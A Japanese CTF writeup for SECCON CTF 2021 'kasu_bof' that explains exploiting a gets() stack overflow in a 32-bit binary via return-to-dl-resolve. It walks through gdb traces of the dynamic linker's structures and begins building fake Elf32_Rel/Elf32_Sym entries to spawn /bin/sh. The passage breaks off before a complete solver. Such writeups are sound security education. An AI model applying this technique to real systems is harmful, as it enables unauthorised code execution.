<!DOCTYPE html>
<html lang="ja-jp">

    <head><title>SECCON CTF 2021 - kasu_bof Writeup &ndash; Team Enu</title>
<meta name="description" content="Team EnuのWriteupや活動の紹介を掲載しています。">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="UTF-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin="anonymous" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />


<link rel="stylesheet" href="http://localhost:8080/css/palettes/base16-dark.css">
<link rel="stylesheet" href="http://localhost:8080/css/risotto.css">
<link rel="stylesheet" href="http://localhost:8080/css/custom.css">
</head>

    <body>
        <div class="page">

            <header class="page__header"><h1 class="page__logo"><a href="http://localhost:8080" class="page__logo-inner">Team Enu</a></h1>
<nav class="page__nav main-nav">
    <ul>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/writeups/" title="">Writeups</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:8080/news/" title="">News</a></li>
    
    </ul>
</nav>

</header>

            <section class="page__body">
    <header class="content__header">
        <h1>SECCON CTF 2021 - kasu_bof Writeup</h1>
    </header>
    <div class="content__body">
        
<h3 id="headline-1">
問題
</h3>
<h4 id="headline-2">
問題文
</h4>
<pre class="example">
## Question
Do you understand return-to-dl-resolve attack on 32-bit?
</pre>
<h4 id="headline-3">
配布ファイル
</h4>
<ul>
<li>
<p>
<code>main.c</code>
</p>
</li>
<li>
<p>
<code>chall</code>
</p>
</li>
</ul>
<h5 id="headline-4">
<code>main.c</code>
</h5>
<div class="src src-c">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
    <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
      <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x80</span>];
      gets(buf);
      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
    }</code></pre></div>
</div>
<h5 id="headline-5">
<code>chall</code>
</h5>
<pre class="example">
mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ file chall
chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cb260735eeb00c173f7f530e9fae9ee3704e6c6f, for GNU/Linux 3.2.0, not stripped

mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
[*] '/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</pre>
<ul>
<li>
<p>
x86
</p>
</li>
<li>
<p>
SSP (Stack Smashing Protection) 無効
</p>
</li>
<li>
<p>
Partial RELRO
</p>
</li>
</ul>
<h3 id="headline-6">
方針
</h3>
<p>
配布されたソースコード ( <code>main.c</code> )を見てみると、以下の特徴がある。
</p>
<ul>
<li>
<p>
<code>char</code> 型の配列 <code>buf</code> のサイズが <code>0x80</code> byte 
</p>
</li>
<li>
<p>
<code>gets</code> を使用しているため、 <code>\n</code> (0x0a) が入力されるまで配列 <code>buf</code> に任意の文字を入力可能
</p>
</li>
</ul>
<p>
このことから、配布されたプログラムには簡単なスタックバッファオーバフローの脆弱性があることがわかる。
</p>
<p>
また、問題文に <code>return to dl resolve</code> という攻撃方法を使用すれば良い旨のコメントがあるため、
スタックバッファオーバフローを利用して、 <code>return to dl resolve</code> を用いて <code>shell</code> を起動できるとよさそうである。
</p>
<p>
よって、この問題以下の方針で解いていく。
</p>
<ol>
<li>
<p>
<strong>return to dl resolve</strong> を利用するため、 <code>.plt</code> セクションからライブラリ関数のアドレスが解決するまでの流れを調査
</p>
</li>
<li>
<p>
1.を踏まえて、 <strong>return to dl resolve</strong> を利用し、 <code>shell</code> を起動
</p>
</li>
</ol>
<h3 id="headline-7">
1. return to dl resolve (ret2dl resolve)
</h3>
<p>
return to dl resolveは、ライブラリ関数のアドレスを動的に解決する際に呼び出される関数である <code>_dl_runtime_resolve</code> を利用し、任意のライブラリ関数を呼び出す攻撃手法である。
</p>
<p>
   この攻撃の流れは以下のようになる。
</p>
<ol>
<li>
<p>
任意の関数(ここでは <code>shell</code> )を呼ぶため、 <code>_dl_runtime_resolve</code> に読み込ませる偽の <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体のオブジェクト、および NULL終端文字列 <code>&#34;system&#34;</code> と <code>&#34;/bin/sh&#34;</code> を書き込み可能な領域に用意
</p>
</li>
<li>
<p>
<code>_dl_runtime_resolve</code> が <code>Elf32_Rel</code> 構造体を特定するために引数に取る <code>reloc_arg</code> を、偽の <code>Elf32_Rel</code> を指すように指定
</p>
</li>
<li>
<p>
<code>.plt</code> の先頭にジャンプし、偽の構造体を元に <code>system</code> のアドレスを解決し、 <code>system(&#34;/bin/sh&#34;)</code> を実行
</p>
</li>
</ol>
<p>
そこで、以下では、pltセクションからアドレス解決の流れを説明し、如何にして偽の構造体を作成すればよいかについて説明する。
</p>
<h4 id="headline-8">
<code>main</code> から <code>gets</code> が呼び出される全体の流れ
</h4>
<p>
問題のプログラムをディスアセンブルし、どのようにして <code>gets</code> が呼び出されているのか確認してみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049180 &lt;main&gt;:
8049180:       55                      push   ebp
8049181:       89 e5                   mov    ebp,esp
8049183:       81 ec 98 00 00 00       sub    esp,0x98
8049189:       8d 85 7c ff ff ff       lea    eax,[ebp-0x84]
804918f:       c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0
8049196:       89 04 24                mov    DWORD PTR [esp],eax
8049199:       e8 a2 fe ff ff          call   8049040 &lt;gets@plt&gt;
804919e:       31 c9                   xor    ecx,ecx
80491a0:       89 85 78 ff ff ff       mov    DWORD PTR [ebp-0x88],eax
80491a6:       89 c8                   mov    eax,ecx
80491a8:       81 c4 98 00 00 00       add    esp,0x98
80491ae:       5d                      pop    ebp
80491af:       c3                      ret</code></pre></div>
</div>
<p>
ディスアセンブルした <code>main</code> を見てみると、 <code>0x8049199</code> のアドレスにおいて、 <code>gets@plt</code> である <code>0x8049040</code> にジャンプしている。 <code>gets@plt</code> は、 <code>.plt</code> セクションに存在するため、 <code>.plt</code> セクションもディスアセンブルしてみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049030 &lt;.plt&gt;:
8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
804903c:       00 00                   add    BYTE PTR [eax],al
    ...

08049040 &lt;gets@plt&gt;:
8049040:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
8049046:       68 00 00 00 00          push   0x0
804904b:       e9 e0 ff ff ff          jmp    8049030 &lt;.plt&gt;

08049050 &lt;__libc_start_main@plt&gt;:
8049050:       ff 25 10 c0 04 08       jmp    DWORD PTR ds:0x804c010
8049056:       68 08 00 00 00          push   0x8
804905b:       e9 d0 ff ff ff          jmp    8049030 &lt;.plt&gt;</code></pre></div>
</div>
<p>
先程呼ばれた <code>gets@plt</code> を確認してみると、 まず <code>jmp    DWORD PTR ds:0x804c00c</code> で <code>0x804c00c</code> 番地に格納されたアドレスへジャンプしている。この <code>0x804c00c</code> のアドレスは、GOTと呼ばれる領域にあり、最終的に解決された <code>gets</code> のアドレスが格納される。
</p>
<p>
    ここで、checksecの結果から、配布された実行ファイルは <strong>Partial RELRO</strong> であることがわかっている。
    <strong>Partial RELRO</strong> は、共有ライブラリが遅延バインドされることを表しており、1回目のライブラリ関数の呼び出しの際に、共有ライブラリのアドレスを解決し、解決したアドレスをGOTへ格納する。
    このため、2回目以降のライブラリ関数の呼び出しは、GOTに格納された解決済のアドレスへジャンプすることで可能となる。
</p>
<p>
そこで、1回目の <code>gets@plt</code> の呼び出し時に、GOTには何が格納されているのか確認してみる。
</p>
<p>
    以下は、 <code>gets@plt</code> を呼び出す前のGOTの状態。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  got

GOT protection: Partial RelRO | GOT functions: 2

[0x804c00c] gets@GLIBC_2.0  →  0x8049046
[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7de1de0</code></pre></div>
</div>
<p>
GOTを確認すると、次の命令のアドレス ( <code>0x8049046</code> )がGOTに格納されていることがわかる。
    このため、引き続き <code>0x8049046</code> からの命令読んでいく。
</p>
<p>
    次の命令 <code>push   0x0</code> では、スタックに <code>0x0</code> を積み、その後 <code>jmp    8049030 &lt;.plt&gt;</code> で <code>.plt</code> セクションの先頭にジャンプしている。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049030 &lt;.plt&gt;:
8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
804903c:       00 00                   add    BYTE PTR [eax],al</code></pre></div>
</div>
<p>
    <code>.plt</code> の先頭の命令は、 <code>push   DWORD PTR ds:0x804c004</code> となっており、 <code>0x804c004</code> に格納されている値をスタックに積む。
    そして、次の命令 <code>jmp    DWORD PTR ds:0x804c008</code> で <code>0x804c008</code> に格納されているアドレスへジャンプする。
</p>
<p>
    ここで、 <code>0x804c004</code> および <code>0x804c008</code> 番地には何が格納されているのか調べてみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  hexdump dword 0x804c004
0x0804c004│+0x0000   &lt;_GLOBAL_OFFSET_TABLE_+0004&gt; 0xf7ffd990   
0x0804c008│+0x0004   &lt;_GLOBAL_OFFSET_TABLE_+0008&gt; 0xf7fe7ac0</code></pre></div>
</div>
<p>
すると、これらのアドレスはGOT先頭付近のアドレスであり、それぞれ <code>0xf7ffd990</code> と <code>0xf7fe7ac0</code> の値が格納されていることがわかる。
</p>
<p>
    まとめると、 <code>.plt</code> の先頭の命令では、スタックに <code>0xf7ffd990</code> を積み、 <code>0xf7fe7ac0</code> 番地へジャンプしている。
    そして、 <code>0xf7fe7ac0</code> へジャンプ後、 <code>gets</code> のアドレスが解決され、 <code>gets</code> が実行される。
    また、二回目以降の呼び出しのために、解決されたアドレスは、GOTへ格納される。
</p>
<p>
    以上が <code>main</code> から <code>gets</code> が実行されるまでの流れであり、 <code>return to dl resolve</code> をするために必要となる <code>.plt</code> セクション以降の流れについて以降では詳しく見ていく。
</p>
<h4 id="headline-9">
<code>.plt</code> セクションからアドレス解決の流れ
</h4>
<p>
さて、 <code>main</code> から <code>gets</code> が呼び出される全体像が掴めたところで、最後にジャンプしたアドレス <code>0xf7fe7ac0</code> から先を追ってみる。
</p>
<p>
    ジャンプ先の <code>0xf7fe7ac0</code> は <code>_dl_runtime_resolve</code> となっており、この関数により <code>gets</code> のアドレスが解決される。
     <code>_dl_runtime_resolve</code> は引数として <code>link_map</code> 構造体と、後述する <code>Elf32_Rel</code> 構造体へのオフセットを示す <code>reloc_arg</code> という2つの値を取る。
</p>
<p>
    そこで、ここから先では、 <code>_dl_runtime_resolve</code> を呼び出す際にスタックに積まれた <code>0xf7ffd990</code> を <code>_dl_runtime_resolve</code> の第一引数である <code>link_map</code> 構造体のアドレス、 <code>0x0</code> を第二引数である <code>reloc_arg</code> として扱う。
</p>
<p>
それでは、次にライブラリ関数の名前解決をする際に必要な情報を含んでいるそれぞれのセクションについて調べていく。    
</p>
<h5 id="headline-10">
<code>.dynamic</code> セクション
</h5>
<p>
<code>.dynamic</code> セクションは、 <code>.rel.plt</code> や <code>.dynsym</code> , <code>.dynstr</code> セクションなどのアドレス情報を保持しているセクションである。
</p>
<p>
  このため、ライブラリ関数の名前解決をする際は、このセクションを最初に参照し、名前解決に必要な情報が含まれるセクションの配置されているアドレスを取得する。
</p>
<p>
  <code>.dynamic</code> セクションは、 <code>ELF32_Dyn</code> 構造体のエントリが連続して配置されている。
</p>
<p>
  そこで、 <code>ELF32_Dyn</code> 構造体の定義をgdbで参照してみる。
</p>
<p>
  gdbから、構造体の定義を得るために、libcにおけるデバッグ情報を取得しておく。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ sudo apt install libc6-dbg libc6-dbg:i386</code></pre></div>
</div>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  break main
gef➤  run
gef➤  info types Elf32_Dyn
All types matching regular expression &#34;Elf32_Dyn&#34;:

File ../elf/elf.h:
838:    typedef struct {...} Elf32_Dyn;gef➤  info types Elf32_Dyn
All types matching regular expression &#34;Elf32_Dyn&#34;:

File ../elf/elf.h:
838:    typedef struct {...} Elf32_Dyn;
gef➤  ptype /o Elf32_Dyn
type = struct {
/*    0      |     4 */    Elf32_Sword d_tag;
/*    4      |     4 */    union {
/*                 4 */        Elf32_Word d_val;
/*                 4 */        Elf32_Addr d_ptr;

                            /* total size (bytes):    4 */
                        } d_un;

                        /* total size (bytes):    8 */
                      }</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコードにおける定義
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840</a>
</p>
</li>
</ul>
</li>
</ul>
<p>
  <code>Elf32_Dyn</code> 構造体は、 それぞれの構造体がどのセクションの何の情報を持つのか表す識別子である <code>d_tag</code> と、 <code>d_tag</code> に対応した値を <code>union</code> 型として持つ。
</p>
<p>
  ここで、 <code>.dynamic</code> セクションを参照するため、このセクションのそのもののアドレスを得るためには、 <code>link_map</code> 構造体の <code>l_info</code> フィールドを参照する必要がある。
</p>
<p>
  そこで、次に <code>link_map</code> 構造体の構造と、 <code>.dynamic</code> セクションそのもののアドレスを解決する流れを見ていく。 
</p>
<h6 id="headline-11">
<code>link_map</code> 構造体
</h6>
<p>
<code>link_map</code> 構造体は、ELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス、再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。
</p>
<p>
   それでは、 <code>link_map</code> 構造体の構造を知るために、gdbを用いて定義を参照してみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types link_map
All types matching regular expression &#34;link_map&#34;:

File ../elf/link.h:
84:	struct link_map_public;

File ../include/link.h:
91:	struct link_map;
271:	struct link_map_reldeps;

File ../sysdeps/x86/linkmap.h:
10:	struct link_map_machine;
gef➤  ptype /o struct link_map
/* offset    |  size */  type = struct link_map {
/*    0      |     4 */    Elf32_Addr l_addr;
/*    4      |     4 */    char *l_name;
/*    8      |     4 */    Elf32_Dyn *l_ld;
/*   12      |     4 */    struct link_map *l_next;
/*   16      |     4 */    struct link_map *l_prev;
/*   20      |     4 */    struct link_map *l_real;
/*   24      |     4 */    Lmid_t l_ns;
/*   28      |     4 */    struct libname_list *l_libname;
/*   32      |   308 */    Elf32_Dyn *l_info[77];
/*  340      |     4 */    const Elf32_Phdr *l_phdr;
...</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコードの定義はここ
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95">https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95</a>
</p>
</li>
</ul>
<p>
<strong>return to dl resolve</strong> において、 <code>link_map</code> 構造体の <code>offset</code> が32の位置に保持されている <code>l_info</code> フィールドを利用する。
 <code>l_info</code> は、各セクションへのアドレスを保持している。
</p>
<p>
各セクションが格納されている <code>l_info</code> のインデックスは、 <code>d_tag</code> に格納される。
</p>
<ul>
<li>
<p>
d_tagに代入されうる値の一覧
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862</a>
</p>
<div class="src src-c">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Legal values for d_tag (dynamic entry type).  */</span>
...
<span style="color:#75715e">#define DT_STRTAB	5		</span><span style="color:#75715e">/* Address of string table */</span><span style="color:#75715e">
</span><span style="color:#75715e">#define DT_SYMTAB	6		</span><span style="color:#75715e">/* Address of symbol table */</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>...
<span style="color:#75715e">#define DT_REL	17		</span><span style="color:#75715e">/* Address of Rel relocs */</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>...
<span style="color:#75715e">#define DT_JMPREL	23		</span><span style="color:#75715e">/* Address of PLT relocs */</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>...</code></pre></div>
</div>
</li>
</ul>
</li>
</ul>
<p>
例えば、 <code>.dynamic</code> セクションのアドレスを参照したい場合、 <code>d_tag</code> が <code>DT_JMPREL</code> の <code>Elf32_Dyn</code> 構造体を参照すればよいため、 <code>l_info[23]</code> とすることで参照することができる。
</p>
</li>
</ul>
<p>
ここで、実際にgdbを用いて <code>link_map</code> 構造体から <code>.dynamic</code> セクションのアドレスを解決してみる。
</p>
<p>
   <code>_dl_runtime_resolve</code> の第一引数である <code>0xf7ffd990</code> は <code>link_map</code> 構造体のアドレスであるため、 <code>0xf7ffd990</code> を <code>link_map</code> 構造体のアドレスとし、表示する。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $link_map = (struct link_map*) 0xf7ffd990
gef➤  print *$link_map.l_info[23]
$5 = {
d_tag = 0x17,
d_un = {
 d_val = 0x80482d8,
 d_ptr = 0x80482d8
}
}</code></pre></div>
</div>
<p>
   すると <code>link_map</code> 構造体のそれぞれのメンバの値が確認できる。
   例えば、 <code>dynamic</code> セクションのアドレス情報は、 <code>l_info[23]</code> を参照することにより得ることができる。
   このため、これを表示してみると、 <code>d_ptr</code> には <code>0x80482d8</code> が格納されており、 <code>.dynamic</code> セクションのアドレスは <code>0x80482d8</code> だということがわかる。
</p>
<p>
   それでは、次にライブラリ関数の名前解決に必要な他のセクションの情報を参照していく。
</p>
<h5 id="headline-12">
<code>.rel.plt</code> セクション
</h5>
<p>
<code>rel.plt</code> セクションは、解決したアドレスを格納するGOTのアドレスとシンボルの情報を得るために必要な情報を持つ。
</p>
<p>
  <code>rel.plt</code> セクションは、 <code>Elf32_Rel</code> 構造体の配列となっており、 <code>Elf32_Rel</code> 構造体の定義は以下のようになっている。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Rel
All types matching regular expression &#34;Elf32_Rel&#34;:

File ../elf/elf.h:
638:    typedef struct {...} Elf32_Rel;
658:    typedef struct {...} Elf32_Rela;
gef➤  ptype /o Elf32_Rel
type = struct {
/*    0      |     4 */    Elf32_Addr r_offset;
/*    4      |     4 */    Elf32_Word r_info;

                         /* total size (bytes):    8 */
                       }</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコード
</p>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634</a>
</p>
</li>
</ul>
<p>
<code>.dynamic</code> セクションから取得した <code>.rel.plt</code> のアドレス先をgdbでダンプしてみる。
ここで、 <code>dl_runtime_resolve</code> の第二引数である <code>reloc_arg</code> は、 <code>.rel.plt</code> セクションの先頭アドレスから、参照する <code>Elf32_Rel</code> 構造体までのオフセットとなっている。
</p>
</li>
</ul>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $reloc_arg = 0x0
gef➤  set $reloc = (Elf32_Rel *)($link_map.l_info[23].d_un.d_ptr + $reloc_arg)
gef➤  print *reloc
$11 = {
r_offset = 0x804c00c,
r_info = 0x107
}</code></pre></div>
</div>
<p>
    ここで、 <code>r_offset</code> はライブラリ関数のアドレスを解決後に、そのアドレスを格納するGOT領域のエントリとなる。
    このため、 <code>gets</code> のアドレスが解決されると、 <code>0x804c00c</code> にそのアドレスが格納されることになる。
</p>
<p>
    <code>r_info</code> は、シンボルを解決するために使用される。
    <code>r_info</code> を 8 byte 右シフトすることにより、 <code>.dynsym</code> のインデックスを取得することができる。
</p>
<div class="src src-c">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>

<span style="color:#75715e">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
</span><span style="color:#75715e">#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
</span><span style="color:#75715e">#define ELF32_R_INFO(sym, type)	(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></code></pre></div>
</div>
<h5 id="headline-13">
<code>.dynsym</code> セクション
</h5>
<p>
<code>.dynsym</code> セクションは、アドレス解決する関数のシンボルのサイズやオフセットなどの情報を持つ。
</p>
<p>
    また、 <code>.dynsym</code> セクションは、 <code>Elf32_Sym</code> 構造体の配列となっている。
</p>
<p>
     <code>Elf32_Sym</code> 構造体をgdbで参照してみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Sym
All types matching regular expression &#34;Elf32_Sym&#34;:

File ../elf/elf.h:
527:    typedef struct {...} Elf32_Sym;
gef➤  ptype /o Elf32_Sym
type = struct {
/*    0      |     4 */    Elf32_Word st_name;
/*    4      |     4 */    Elf32_Addr st_value;
/*    8      |     4 */    Elf32_Word st_size;
/*   12      |     1 */    unsigned char st_info;
/*   13      |     1 */    unsigned char st_other;
/*   14      |     2 */    Elf32_Section st_shndx;

                      /* total size (bytes):   16 */
                    }</code></pre></div>
</div>
<ul>
<li>
<p>
ソースコード
</p>
</li>
</ul>
<ul>
<li>
<p>
<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519</a>
</p>
<p>
  ここで、 <code>st_name</code> は、実際にシンボルが置かれている <code>.dynstr</code> セクションのオフセットを指している。
 そこで、 <code>r_info</code> からインデックスを計算し、実際に <code>Elf32_Sym</code> のアドレスを特定してみる。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $symtab = (Elf32_Sym *)($link_map.l_info[6].d_un.d_ptr)
gef➤  set $sym = $symtab[$reloc.r_info&gt;&gt;8]
gef➤  print $sym
$13 = {
st_name = 0x1a,
st_value = 0x0,
st_size = 0x0,
st_info = 0x12,
st_other = 0x0,
st_shndx = 0x0
}</code></pre></div>
</div>
</li>
</ul>
<h5 id="headline-14">
<code>.dynstr</code> セクション
</h5>
<p>
<code>st_name</code> のオフセットを <code>.dynstr</code> セクションのアドレスに足し合わせたアドレスが、シンボルを指すアドレスとなっている。
</p>
<div class="src src-text">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $strtab = (char *)($link_map.l_info[5].d_un.d_ptr)
gef➤  set $gets_symbol = $strtab + $sym.st_name
gef➤  print $gets_symbol
$15 = 0x8048276 &#34;gets&#34;</code></pre></div>
</div>
<p>
これにより、 <code>link_map</code> 構造体から <code>gets</code> のシンボルが解決されるまでの流れを把握することができた。
</p>
<p>
    そこで、次にこの流れを踏まえた上で、 <code>system(&#34;/bin/sh&#34;)</code> 呼び出すためのSolverを作成していく。
</p>
<h3 id="headline-15">
2. Solverの作成    
</h3>
<h4 id="headline-16">
Solverの準備
</h4>
<p>
上記の流れを図にすると、それぞれのセクションと構造体とシンボルの関係は以下のようになる。
</p>
<pre class="example">
        .rel.plt                         .dynsym                                           .dynstr                                    
            |                                |                                                 |
            |                                |                                                 |
reloc_arg---+   reloc_arg + .rel.plt         |                                                 |
            |                                |                                                 |
            +-->|-----------+----------|     |                                                 |
                | Elf32_Rel | r_offset |     |                                                 |
                |           | r_info   |-----+  ((r_info>>8) + .dynsym)*sizeof(Elf32_Sym)      |
                |-----------+----------|     |                                                 |
                                             |                                                 |
                                             +->|-----------+---------------------------|      |
                                                | Elf32_Sym | st_name                   |------+   st_name + .dynstr
                                                |           | st_value                  |      |
                                                |           | st_size                   |      |
                                                |           | st_info st_other st_shndx |      |
                                                |-----------+---------------------------|      |
                                                                                               |
                                                                                               +-->|-----------+--------|
                                                                                                   | symbol    | 'gets' |
                                                                                                   |-----------+--------|
</pre>
<p>
ここで、 <code>reloc_arg</code> にはスタックバッファオーバフローを利用して任意の値を指定することが可能なため、 <code>.rel.plt</code> の値から偽の <code>Elf32_Rel</code> 構造体を配置したアドレスまでのオフセットを設定する。
</p>
<div class="src src-python">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  reloc_arg <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">-</span> rel</code></pre></div>
</div>
<p>
    また、偽の <code>Elf32_Rel</code> 構造体では、 <code>r_info</code> を 8 bitだけ右シフトした値を <code>.dynsym</code> を基準とした偽の <code>Elf32_Sym</code> 構造体へのインデックスとして使用する。
    このため、事前にインデックスを計算し、 <code>Elf32_Rel</code> 構造体に格納しておく。
    このとき、 <code>r_info</code> の下bitが <code>0b111 (0x7)</code> である必要があるため、最後に <code>7</code> を or することで下3bitに1を立てている。
</p>
<p>
    <code>r_offset</code> は、解決されたアドレスが格納されるアドレスであり、通常は <code>.got</code> の対応するエントリを指している。
    今回は特に関係ないものの、 <code>gets</code> の GOTエントリを指定しておく。    
</p>
<div class="src src-python">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  r_offset <span style="color:#f92672">=</span> gets_got
  r_info   <span style="color:#f92672">=</span> ((Elf32_Sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span></code></pre></div>
</div>
<p>
    <code>Elf32_Sym</code> 構造体の <code>st_name</code> は、 <code>.dynstr</code> の値から <code>system</code> のシンボルを配置したアドレスまでのオフセットを設定する。
    このため、事前にオフセットの値を計算し、 <code>Elf32_Sym</code> 構造体に格納しておく。
</p>
<p>
    <code>st_info</code> は、グローバル関数であることを指す <code>0x12</code> を設定しておく必要があるため、設定しておく。
</p>
<div class="src src-python">
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span></code></pre></div>
</div>
<h5 id="headline-17">
<code>.bss</code> 領域への作成した構造体やシンボルの格納
</h5>
<p>
<code>.bss</code> 領域には、以下のように作成した <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体、 <code>system</code> のシンボル、および <code>/bin/sh</code> の文字列が格納する。    
</p>
<pre class="example">
|-----------+----------.bss-------------+---------|
